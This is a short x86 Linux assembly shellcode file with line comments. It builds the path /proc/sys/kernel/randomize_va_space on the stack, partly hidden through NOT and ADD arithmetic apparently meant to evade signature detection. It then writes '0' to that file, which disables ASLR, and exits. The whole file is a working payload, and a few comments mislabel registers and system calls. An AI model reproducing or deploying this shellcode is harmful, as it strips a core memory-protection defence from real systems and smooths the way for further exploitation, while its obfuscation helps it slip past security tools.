global _start

section .text

_start:

xor    eax, eax		; zero out eax register
push   eax		; push zero onto the stack
;objective is to push   0x65636170 ecap onto stack
mov ebx, 0x9A9C9E8F	;mov 0x9A9C9E8F to ebx register
not ebx			;not(0x9A9C9E8F) = 0x65636170
mov dword [esp-4], ebx	; mov 0x65636170 to [esp-4]
sub esp, 4
push   0x735f6176	;s_av
push   0x5f657a69	;_ezi
push   0x6d6f646e	;modn
push   0x61722f6c	;ar/l
push   0x656e7265	;enre
push   0x6b2f7379	;k/sy
; objective is to push   0x732f636f s/co onto stack, this is done by following instructions
mov ebx, 0x621e525e
add  ebx, 0x11111111
push ebx		
push   0x72702f2f	;rp//


mov    ebx, esp		; pointer to arg is placed 
mov    cx, 0x2bc	; mov 0x2bc (+) to cx register
mov    al, 0x8		; mov 0x8 to al register, sys call number for creat
int    0x80		; sys call for creat invoked
mov    ebx, eax		; move eax to ebx register
push   eax		; push zero on to stack
mov    dx, 0x3a30	; move :0 to dx register
push   dx		; push :0 onto stack
xchg    ecx, esp		; pointer to argv is placed in ecx
xor    edx, edx		; zero out edx register
inc    edx		; increment edx register
mov    al, 0x4		; 	move 0x4 to al register, sys call num for write
int    0x80		; sys call for write invoked
mov    al, 0x6		; 	mov 0x6 to al register , system call for close
int    0x80		; system call for close invoked
inc    eax		; increment eax (eax=1)	. sys call for exit
int    0x80		; sys call for write invoked
